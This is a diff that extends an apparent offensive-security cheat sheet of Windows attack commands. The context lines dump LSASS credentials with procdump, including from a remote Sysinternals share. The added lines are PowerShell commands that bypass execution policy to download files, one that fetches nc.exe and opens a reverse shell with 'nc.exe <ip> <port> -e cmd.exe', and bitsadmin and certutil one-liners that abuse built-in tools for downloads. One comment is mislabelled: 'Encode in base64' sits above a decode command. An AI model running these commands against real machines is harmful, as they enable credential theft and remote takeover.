@@ -323,3 +323,27 @@ C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 
 # procdump - dump lsass - remote
 net use Z: https://live.sysinternals.com; Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp 
+
+% powershell, download
+
+# Download with powershell
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile "(New-Object System.Net.WebClient).DownloadFile('http://<server>/<source_file>','<dest_file>')" 
+
+# Download and execute with powershell
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile New-Object System.Net.WebClient.DownloadFile('<url_file>','nc.exe'); nc.exe <ip> <port> -e cmd.exe
+
+% windows, bitsadmin
+
+# Download file with bitsadmin
+bitsadmin /Transfer myJob http://<ip>/<file|file.txt> <path|C:\windows\temp> 
+
+% windows, certutil
+
+# download with certutil
+certutil.exe -urlcache -split -f http://<server>/<source_file> <dest_file> 
+
+# download with  certutil (2)
+certutil.exe -verifyctl -f -split h http://<server>/<source_file> <dest_file> 
+
+# Encode in base64 with certutil 
+certutil -decode <in_file> <out_file> 
